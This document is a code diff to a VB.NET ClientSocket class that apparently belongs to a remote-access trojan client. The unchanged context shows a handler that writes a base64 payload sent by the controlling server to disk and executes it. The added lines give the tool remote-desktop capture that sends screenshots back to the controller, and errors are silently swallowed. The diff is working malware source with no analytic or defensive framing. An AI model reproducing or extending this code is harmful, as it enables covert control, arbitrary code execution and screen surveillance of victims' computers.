@@ -67,7 +67,6 @@ Public Class ClientSocket
                     MS.Flush()
                     MS.Dispose()
                     MS = New MemoryStream
-                    Buffer = New Byte(999999) {}
                 End If
             End If
             S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
@@ -87,6 +86,13 @@ Public Class ClientSocket
                     File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                     Threading.Thread.Sleep(500)
                     Diagnostics.Process.Start(NewFile)
+
+                Case "RD-"
+                    Send("RD-")
+
+                Case "RD+"
+                    Send("RD+" + SPL + BS(RemoteDesktop.Capture(A(1), A(2))))
+
             End Select
         Catch ex As Exception
         End Try
@@ -94,13 +100,12 @@ Public Class ClientSocket
 
     Private Shared Sub Send(ByVal msg As String)
         Try
-            Using M As New MemoryStream
-                M.Write(SB(msg), 0, msg.Length)
-                M.Write(SB(EOF), 0, EOF.Length)
-                S.BeginSend(M.ToArray, 0, M.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
-                M.Flush()
-                M.Dispose()
-            End Using
+            Dim M As New MemoryStream
+            M.Write(SB(msg), 0, msg.Length)
+            M.Write(SB(EOF), 0, EOF.Length)
+            S.BeginSend(M.ToArray, 0, M.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
+            M.Flush()
+            M.Dispose()
         Catch ex As Exception
             Disconnected()
         End Try
